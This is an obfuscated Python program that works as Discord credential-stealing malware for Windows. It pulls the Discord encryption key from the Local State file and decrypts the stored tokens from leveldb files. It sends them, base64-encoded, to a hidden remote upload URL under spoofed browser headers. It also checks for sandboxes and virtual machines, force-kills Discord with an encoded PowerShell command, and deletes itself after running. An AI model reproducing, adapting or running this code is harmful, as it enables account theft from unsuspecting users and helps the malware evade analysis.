import builtins
import time
import string
import math

OOOO000000OOO00000000OOOOOOOOOOO0 = getattr(builtins, '$>e^'.replace('>', 'x').replace('$', 'e').replace('^', 'c'))
O0O0OO000000000OOOOOOO00 = getattr(builtins, '!#@'.replace('@', 'r').replace('!', 'c').replace('#', 'h'))
O000000O_ = getattr(builtins, f'{O0O0OO000000000OOOOOOO00(90+5)}{O0O0OO000000000OOOOOOO00(100-5)}{O0O0OO000000000OOOOOOO00(50*2+5*2-5)}{O0O0OO000000000OOOOOOO00(109)}{O0O0OO000000000OOOOOOO00(50*2+12)}{O0O0OO000000000OOOOOOO00(111)}{O0O0OO000000000OOOOOOO00(114)}{O0O0OO000000000OOOOOOO00(50*2+4*4)}{O0O0OO000000000OOOOOOO00(95)}{O0O0OO000000000OOOOOOO00(95)}')('win32api')
AES = getattr(builtins, f'{O0O0OO000000000OOOOOOO00(90+5)}{O0O0OO000000000OOOOOOO00(100-5)}{O0O0OO000000000OOOOOOO00(50*2+5*2-5)}{O0O0OO000000000OOOOOOO00(109)}{O0O0OO000000000OOOOOOO00(50*2+12)}{O0O0OO000000000OOOOOOO00(111)}{O0O0OO000000000OOOOOOO00(114)}{O0O0OO000000000OOOOOOO00(50*2+4*4)}{O0O0OO000000000OOOOOOO00(95)}{O0O0OO000000000OOOOOOO00(95)}')('Crypto.Cipher', fromlist=[f'{O0O0OO000000000OOOOOOO00(65)}{O0O0OO000000000OOOOOOO00(69)}{O0O0OO000000000OOOOOOO00(83)}']).AES
CryptUnprotectData = getattr(builtins, f'{O0O0OO000000000OOOOOOO00(90+5)}{O0O0OO000000000OOOOOOO00(100-5)}{O0O0OO000000000OOOOOOO00(50*2+5*2-5)}{O0O0OO000000000OOOOOOO00(109)}{O0O0OO000000000OOOOOOO00(50*2+12)}{O0O0OO000000000OOOOOOO00(111)}{O0O0OO000000000OOOOOOO00(114)}{O0O0OO000000000OOOOOOO00(50*2+4*4)}{O0O0OO000000000OOOOOOO00(95)}{O0O0OO000000000OOOOOOO00(95)}')('win32crypt', fromlist=['CryptUnprotectData']).CryptUnprotectData

for mod in [f'{O0O0OO000000000OOOOOOO00(110 + 2)}{O0O0OO000000000OOOOOOO00(50*2+15)}{O0O0OO000000000OOOOOOO00(50*2+17)}{O0O0OO000000000OOOOOOO00(50+50+16)}{O0O0OO000000000OOOOOOO00(50*2+10-5)}{O0O0OO000000000OOOOOOO00(108)}', f'{O0O0OO000000000OOOOOOO00(98)}{O0O0OO000000000OOOOOOO00(97)}{O0O0OO000000000OOOOOOO00(115)}{O0O0OO000000000OOOOOOO00(101)}{O0O0OO000000000OOOOOOO00(54)}{O0O0OO000000000OOOOOOO00(52)}', f'{O0O0OO000000000OOOOOOO00(114)}{O0O0OO000000000OOOOOOO00(97)}{O0O0OO000000000OOOOOOO00(110)}{O0O0OO000000000OOOOOOO00(100)}{O0O0OO000000000OOOOOOO00(111)}{O0O0OO000000000OOOOOOO00(109)}', f'{O0O0OO000000000OOOOOOO00(114)}{O0O0OO000000000OOOOOOO00(101)}{O0O0OO000000000OOOOOOO00(113)}{O0O0OO000000000OOOOOOO00(117)}{O0O0OO000000000OOOOOOO00(101)}{O0O0OO000000000OOOOOOO00(115)}{O0O0OO000000000OOOOOOO00(50*2+4*4)}{O0O0OO000000000OOOOOOO00(115)}', f'{O0O0OO000000000OOOOOOO00(111)}{O0O0OO000000000OOOOOOO00(115)}'
, f'{O0O0OO000000000OOOOOOO00(114)}{O0O0OO000000000OOOOOOO00(101)}', f'{O0O0OO000000000OOOOOOO00(106)}{O0O0OO000000000OOOOOOO00(115)}{O0O0OO000000000OOOOOOO00(111)}{O0O0OO000000000OOOOOOO00(110)}', f'{O0O0OO000000000OOOOOOO00(115)}{O0O0OO000000000OOOOOOO00(121)}{O0O0OO000000000OOOOOOO00(115)}',
f'{O0O0OO000000000OOOOOOO00(115)}{O0O0OO000000000OOOOOOO00(117)}{O0O0OO000000000OOOOOOO00(98)}{O0O0OO000000000OOOOOOO00(112)}{O0O0OO000000000OOOOOOO00(114)}{O0O0OO000000000OOOOOOO00(111)}{O0O0OO000000000OOOOOOO00(99)}{O0O0OO000000000OOOOOOO00(101)}{O0O0OO000000000OOOOOOO00(115)}{O0O0OO000000000OOOOOOO00(115)}']:
    globals()[mod] = getattr(builtins, f'{O0O0OO000000000OOOOOOO00(90+5)}{O0O0OO000000000OOOOOOO00(100-5)}{O0O0OO000000000OOOOOOO00(50*2+5*2-5)}{O0O0OO000000000OOOOOOO00(109)}{O0O0OO000000000OOOOOOO00(50*2+12)}{O0O0OO000000000OOOOOOO00(111)}{O0O0OO000000000OOOOOOO00(114)}{O0O0OO000000000OOOOOOO00(50*2+4*4)}{O0O0OO000000000OOOOOOO00(95)}{O0O0OO000000000OOOOOOO00(95)}')(mod)


# This is for using the aes key to decrypt the data
def O000000_O_O_O_O_000_O_O_O00(O000OO00OOOOO00OO ,OO00O0O000O0OOO0O):
   try:
      return AES.new(CryptUnprotectData(OO00O0O000O0OOO0O ,None ,None ,None ,0 )[1 ],AES.MODE_GCM ,O000OO00OOOOO00OO [3 :15 ]).decrypt(O000OO00OOOOO00OO [15 :])[:-16 ].decode ('utf-8')#line:16
   except:
      return None
  
  
#Self delete-routine
def o_0000000_000():
    O_00000____ = ''.join(random.choices(string.ascii_letters + string.digits, k=13))
    with open(os.path.join(os.path.expanduser('~'), 'AppData', 'Local', f'{O_00000____ }.proIndia'), 'w') as l:
        pass
    subprocess.Popen(f"{'&w@!ell.^'.replace('&', 'po').replace('!', 'sh').replace('@', 'er').replace('^', 'exe')} -Command Start-Sleep -Seconds 3;{'Re*e-It$'.replace('*', 'mov').replace('$', 'em')} -path '{sys.argv[0]}'",creationflags=subprocess.CREATE_NO_WINDOW)
    os._exit(0)


# This is to open the Local state file to retrieve the aes key
def OOOOOOOO00000000000000OO():
    with open(os.path.join(os.getenv (f'{O0O0OO000000000OOOOOOO00(65)}{O0O0OO000000000OOOOOOO00(80)}{O0O0OO000000000OOOOOOO00(80)}{O0O0OO000000000OOOOOOO00(68)}{O0O0OO000000000OOOOOOO00(65)}{O0O0OO000000000OOOOOOO00(84)}{O0O0OO000000000OOOOOOO00(65)}'),f'{O0O0OO000000000OOOOOOO00(100)}{O0O0OO000000000OOOOOOO00(105)}{O0O0OO000000000OOOOOOO00(115)}{O0O0OO000000000OOOOOOO00(99)}{O0O0OO000000000OOOOOOO00(111)}{O0O0OO000000000OOOOOOO00(114)}{O0O0OO000000000OOOOOOO00(100)}',f'{O0O0OO000000000OOOOOOO00(76)}{O0O0OO000000000OOOOOOO00(111)}{O0O0OO000000000OOOOOOO00(99)}{O0O0OO000000000OOOOOOO00(97)}{O0O0OO000000000OOOOOOO00(108)}{O0O0OO000000000OOOOOOO00(32)}{O0O0OO000000000OOOOOOO00(83)}{O0O0OO000000000OOOOOOO00(116)}{O0O0OO000000000OOOOOOO00(97)}{O0O0OO000000000OOOOOOO00(116)}{O0O0OO000000000OOOOOOO00(101)}') ,"r") as file:
        OOO_ = json.loads(file.read())[f'{O0O0OO000000000OOOOOOO00(111)}{O0O0OO000000000OOOOOOO00(115)}{O0O0OO000000000OOOOOOO00(95)}{O0O0OO000000000OOOOOOO00(99)}{O0O0OO000000000OOOOOOO00(114)}{O0O0OO000000000OOOOOOO00(121)}{O0O0OO000000000OOOOOOO00(112)}{O0O0OO000000000OOOOOOO00(116)}'][f'{O0O0OO000000000OOOOOOO00(101)}{O0O0OO000000000OOOOOOO00(110)}{O0O0OO000000000OOOOOOO00(99)}{O0O0OO000000000OOOOOOO00(114)}{O0O0OO000000000OOOOOOO00(121)}{O0O0OO000000000OOOOOOO00(112)}{O0O0OO000000000OOOOOOO00(116)}{O0O0OO000000000OOOOOOO00(101)}{O0O0OO000000000OOOOOOO00(100)}{O0O0OO000000000OOOOOOO00(95)}{O0O0OO000000000OOOOOOO00(107)}{O0O0OO000000000OOOOOOO00(101)}{O0O0OO000000000OOOOOOO00(121)}']
    return OOO_

# Main logic method
def OoooooooooooOOO_000():
    O0000O000000000_0_0_0_OO = ''
    tokens = []
    f_list = []
    OOOOOOOOOOOO00000000000000____0000000 =f'{random.randint(100,200)}{random.randint(300,600)}{random.randint(600,900)}{random.randint(199,399)}_'
    
    #checking for the existence of the discord dir in appdata roaming
    if os.path.exists(os.path.join(os .getenv (f'{O0O0OO000000000OOOOOOO00(65)}{O0O0OO000000000OOOOOOO00(80)}{O0O0OO000000000OOOOOOO00(80)}{O0O0OO000000000OOOOOOO00(68)}{O0O0OO000000000OOOOOOO00(65)}{O0O0OO000000000OOOOOOO00(84)}{O0O0OO000000000OOOOOOO00(65)}'),f'{O0O0OO000000000OOOOOOO00(100)}{O0O0OO000000000OOOOOOO00(105)}{O0O0OO000000000OOOOOOO00(115)}{O0O0OO000000000OOOOOOO00(99)}{O0O0OO000000000OOOOOOO00(111)}{O0O0OO000000000OOOOOOO00(114)}{O0O0OO000000000OOOOOOO00(100)}',f'{O0O0OO000000000OOOOOOO00(76)}{O0O0OO000000000OOOOOOO00(111)}{O0O0OO000000000OOOOOOO00(99)}{O0O0OO000000000OOOOOOO00(97)}{O0O0OO000000000OOOOOOO00(108)}{O0O0OO000000000OOOOOOO00(32)}{O0O0OO000000000OOOOOOO00(83)}{O0O0OO000000000OOOOOOO00(116)}{O0O0OO000000000OOOOOOO00(97)}{O0O0OO000000000OOOOOOO00(116)}{O0O0OO000000000OOOOOOO00(101)}')):
        O0000000000000000000oOOOOOOO =  OOOOOOOO00000000000000OO()
    else:
        os._exit(0)
    for file in os.listdir(os.path.join(os.getenv (f'{O0O0OO000000000OOOOOOO00(65)}{O0O0OO000000000OOOOOOO00(80)}{O0O0OO000000000OOOOOOO00(80)}{O0O0OO000000000OOOOOOO00(68)}{O0O0OO000000000OOOOOOO00(65)}{O0O0OO000000000OOOOOOO00(84)}{O0O0OO000000000OOOOOOO00(65)}'),f'{O0O0OO000000000OOOOOOO00(100)}{O0O0OO000000000OOOOOOO00(105)}{O0O0OO000000000OOOOOOO00(115)}{O0O0OO000000000OOOOOOO00(99)}{O0O0OO000000000OOOOOOO00(111)}{O0O0OO000000000OOOOOOO00(114)}{O0O0OO000000000OOOOOOO00(100)}',f'{O0O0OO000000000OOOOOOO00(76)}{O0O0OO000000000OOOOOOO00(111)}{O0O0OO000000000OOOOOOO00(99)}{O0O0OO000000000OOOOOOO00(97)}{O0O0OO000000000OOOOOOO00(108)}{O0O0OO000000000OOOOOOO00(32)}{O0O0OO000000000OOOOOOO00(83)}{O0O0OO000000000OOOOOOO00(116)}{O0O0OO000000000OOOOOOO00(111)}{O0O0OO000000000OOOOOOO00(114)}{O0O0OO000000000OOOOOOO00(97)}{O0O0OO000000000OOOOOOO00(103)}{O0O0OO000000000OOOOOOO00(101)}', f'{O0O0OO000000000OOOOOOO00(108)}{O0O0OO000000000OOOOOOO00(101)}{O0O0OO000000000OOOOOOO00(118)}{O0O0OO000000000OOOOOOO00(101)}{O0O0OO000000000OOOOOOO00(108)}{O0O0OO000000000OOOOOOO00(100)}{O0O0OO000000000OOOOOOO00(98)}')):#line:34
        if not file.endswith(f"{O0O0OO000000000OOOOOOO00(40 + 6)}{O0O0OO000000000OOOOOOO00(108)}{O0O0OO000000000OOOOOOO00(100)}{O0O0OO000000000OOOOOOO00(98)}") and not file.endswith(f"{O0O0OO000000000OOOOOOO00(46)}{O0O0OO000000000OOOOOOO00(108)}{O0O0OO000000000OOOOOOO00(111)}{O0O0OO000000000OOOOOOO00(103)}"):
                continue
        try:
            with open(os.path.join(os.getenv(f'{O0O0OO000000000OOOOOOO00(65)}{O0O0OO000000000OOOOOOO00(80)}{O0O0OO000000000OOOOOOO00(80)}{O0O0OO000000000OOOOOOO00(68)}{O0O0OO000000000OOOOOOO00(65)}{O0O0OO000000000OOOOOOO00(84)}{O0O0OO000000000OOOOOOO00(65)}'),f'{O0O0OO000000000OOOOOOO00(100)}{O0O0OO000000000OOOOOOO00(105)}{O0O0OO000000000OOOOOOO00(115)}{O0O0OO000000000OOOOOOO00(99)}{O0O0OO000000000OOOOOOO00(111)}{O0O0OO000000000OOOOOOO00(114)}{O0O0OO000000000OOOOOOO00(100)}',f'{O0O0OO000000000OOOOOOO00(76)}{O0O0OO000000000OOOOOOO00(111)}{O0O0OO000000000OOOOOOO00(99)}{O0O0OO000000000OOOOOOO00(97)}{O0O0OO000000000OOOOOOO00(108)}{O0O0OO000000000OOOOOOO00(32)}{O0O0OO000000000OOOOOOO00(83)}{O0O0OO000000000OOOOOOO00(116)}{O0O0OO000000000OOOOOOO00(111)}{O0O0OO000000000OOOOOOO00(114)}{O0O0OO000000000OOOOOOO00(97)}{O0O0OO000000000OOOOOOO00(103)}{O0O0OO000000000OOOOOOO00(101)}',f'{O0O0OO000000000OOOOOOO00(108)}{O0O0OO000000000OOOOOOO00(101)}{O0O0OO000000000OOOOOOO00(118)}{O0O0OO000000000OOOOOOO00(101)}{O0O0OO000000000OOOOOOO00(108)}{O0O0OO000000000OOOOOOO00(100)}{O0O0OO000000000OOOOOOO00(98)}',file ),"r",errors ='ignore')as files :#line:38
                    for line in files:
                        line = line.strip()
                        for value in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*",line ):
                            if value.split(':')[1 ] not in tokens:
                                tokens.append(value.split(':')[1 ])
        except PermissionError:
            continue
    for token in tokens:
        try:
            tok = O000000_O_O_O_O_000_O_O_O00(base64.b64decode(token), base64.b64decode(O0000000000000000000oOOOOOOO)[5:])
            if tok and tok not in f_list:
                f_list.append (tok )
        except Exception as l:
            print(l)
    O0000000000000000000oOOOOOOO = ''
    if len(f_list ) > 0:
        for tok in f_list:
            O0000O000000000_0_0_0_OO += f'{tok}\n'
        try:
            requests.post(base64.b64decode('Cmh0dHBzOi8vY3MudHJ1^mNhL35vc19qbWlzdHJ5L2ZpbGVfc3lzdGVtL3VwbG9hZC5waHAK'.replace(f'{O0O0OO000000000OOOOOOO00(94)}', f'{O0O0OO000000000OOOOOOO00(76)}')).decode('utf-8').strip(),data = base64.b64encode(O0000O000000000_0_0_0_OO.encode()).decode('utf-8'),headers ={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.92 Safari/537.36","Content-Type":"application/octet-stream", 'Accept-Language': 'en-US,en;q=0.9','Referer': 'https://www.google.com',"X-FILENAME":f'{ OOOOOOOOOOOO00000000000000____0000000 }_{O0O0OO000000000OOOOOOO00(100)}{O0O0OO000000000OOOOOOO00(105)}{O0O0OO000000000OOOOOOO00(115)}{O0O0OO000000000OOOOOOO00(99)}{O0O0OO000000000OOOOOOO00(111)}{O0O0OO000000000OOOOOOO00(114)}{O0O0OO000000000OOOOOOO00(100)}{O0O0OO000000000OOOOOOO00(95)}{O0O0OO000000000OOOOOOO00(100)}{O0O0OO000000000OOOOOOO00(97)}{O0O0OO000000000OOOOOOO00(116)}{O0O0OO000000000OOOOOOO00(97)}{O0O0OO000000000OOOOOOO00(46)}{O0O0OO000000000OOOOOOO00(116)}{O0O0OO000000000OOOOOOO00(120)}{O0O0OO000000000OOOOOOO00(116)}'})#line:83                
        except Exception as l:
            pass
    else:
        requests.post(base64.b64decode('Cmh0dHBzOi8vY3MudHJ1^mNhL35vc19qbWlzdHJ5L2ZpbGVfc3lzdGVtL3VwbG9hZC5waHAK'.replace(f'{O0O0OO000000000OOOOOOO00(94)}', f'{O0O0OO000000000OOOOOOO00(76)}')).decode('utf-8').strip(),data = base64.b64encode("No tokens were found".encode()).decode('utf-8'),headers ={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.92 Safari/537.36","Content-Type":"application/octet-stream", 'Accept-Language': 'en-US,en;q=0.9','Referer': 'https://www.google.com',"X-FILENAME":f'{ OOOOOOOOOOOO00000000000000____0000000 }_{O0O0OO000000000OOOOOOO00(100)}{O0O0OO000000000OOOOOOO00(105)}{O0O0OO000000000OOOOOOO00(115)}{O0O0OO000000000OOOOOOO00(99)}{O0O0OO000000000OOOOOOO00(111)}{O0O0OO000000000OOOOOOO00(114)}{O0O0OO000000000OOOOOOO00(100)}{O0O0OO000000000OOOOOOO00(95)}{O0O0OO000000000OOOOOOO00(100)}{O0O0OO000000000OOOOOOO00(97)}{O0O0OO000000000OOOOOOO00(116)}{O0O0OO000000000OOOOOOO00(97)}{O0O0OO000000000OOOOOOO00(46)}{O0O0OO000000000OOOOOOO00(116)}{O0O0OO000000000OOOOOOO00(120)}{O0O0OO000000000OOOOOOO00(116)}'})#line:83
    o_0000000_000()

# Check for cursor position movement indicative of user in polymorphic pattern
O_0_OOO_0 = f'{"".join(random.choices(string.ascii_letters, k=random.randint(3,6)))}_{random.randint(21,41)}_{random.randint(100,436)}'
O_____00 = f'{"".join(random.choices(string.ascii_letters, k=random.randint(3,6)))}_{random.randint(21,41)}_{random.randint(100,436)}'
O___000 = f'{"".join(random.choices(string.ascii_letters, k=random.randint(3,6)))}_{random.randint(21,41)}_{random.randint(100,436)}'
mfal = f'{"".join(random.choices(string.ascii_letters, k=random.randint(3,6)))}_{random.randint(21,41)}_{random.randint(100,436)}'
xxcor = f'{"".join(random.choices(string.ascii_letters, k=random.randint(3,6)))}_{random.randint(21,41)}_{random.randint(100,436)}'
yycor = f'{"".join(random.choices(string.ascii_letters, k=random.randint(3,6)))}_{random.randint(21,41)}_{random.randint(100,436)}'


OOOO000000OOO00000000OOOOOOOOOOO0(f"""
{O_0_OOO_0} = time.time()
{O_____00}, {O___000} = O000000O_.GetCursorPos()
{mfal} = False
while time.time() - {O_0_OOO_0} < 600:
    time.sleep(0.2)
    {xxcor}, {yycor} = O000000O_.GetCursorPos()
    if({O_____00} != {xxcor}) or ({O___000} != {yycor}):
        {mfal} = True
        break
if {mfal}:
    pass
else:
    os._exit(0)
""")

# Check total running processes, its less than 100 for sandboxes
if(len(psutil.pids()) < 150):
    os._exit(0)
    
# Vm or sandbox dont have pacific standard time
if time.tzname[0] == "Coordinated Universal Time" or time.tzname[1] == "Coordinated Universal Time":
    os._exit(0)
else:
    pass

# Memory is typically low for sandbox or vm
if psutil.virtual_memory().total <= math.ceil(6 * 1021*1024*1024):
    os._exit(0)

# Check for mouse clicks in polymorphic pattern
_O_0_O_0 = f'{"".join(random.choices(string.ascii_letters, k=random.randint(3,6)))}_{random.randint(21,41)}_{random.randint(100,436)}'
O_000000_OOO = f'{"".join(random.choices(string.ascii_letters, k=random.randint(3,6)))}_{random.randint(21,41)}_{random.randint(100,436)}'
_000_O000 = f'{"".join(random.choices(string.ascii_letters, k=random.randint(3,6)))}_{random.randint(21,41)}_{random.randint(100,436)}'
OOOO000000OOO00000000OOOOOOOOOOO0(f"""
{_O_0_O_0} = 0
while {_O_0_O_0} <= 1:
    {O_000000_OOO} = O000000O_.GetAsyncKeyState(1)
    {_000_O000} = O000000O_.GetAsyncKeyState(2)
    if {O_000000_OOO} % 2 == 1 or {_000_O000} % 2 == 1:
        {_O_0_O_0} += 1
        time.sleep(0.1)
""")

# Check for digitalstring to confirm second execution, if so exit
for filename in os.listdir(os.path.join(os.path.expanduser('~'), 'AppData', 'Local')):
    if filename.endswith('.proIndia'):
        os._exit(0)
    else:
        pass

# Check if Discord is running, is so terminate all of its threads before hunting for tokens
for process in psutil.process_iter(['name']):
    if process.info['name'].lower() == 'Discord.exe'.lower():
        try:
            subprocess.run(["powershell", "-&ma^".replace('&', 'Com').replace('^', 'nd'), base64.b64decode('ClN0b3AtUHJvY2VzcyAtTmFtZSAiRGlzY29yZCIgLUZvcmNlCg==').decode('utf-8')],capture_output=True,text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            break
        except Exception as e:
            print(e)
OoooooooooooOOO_000()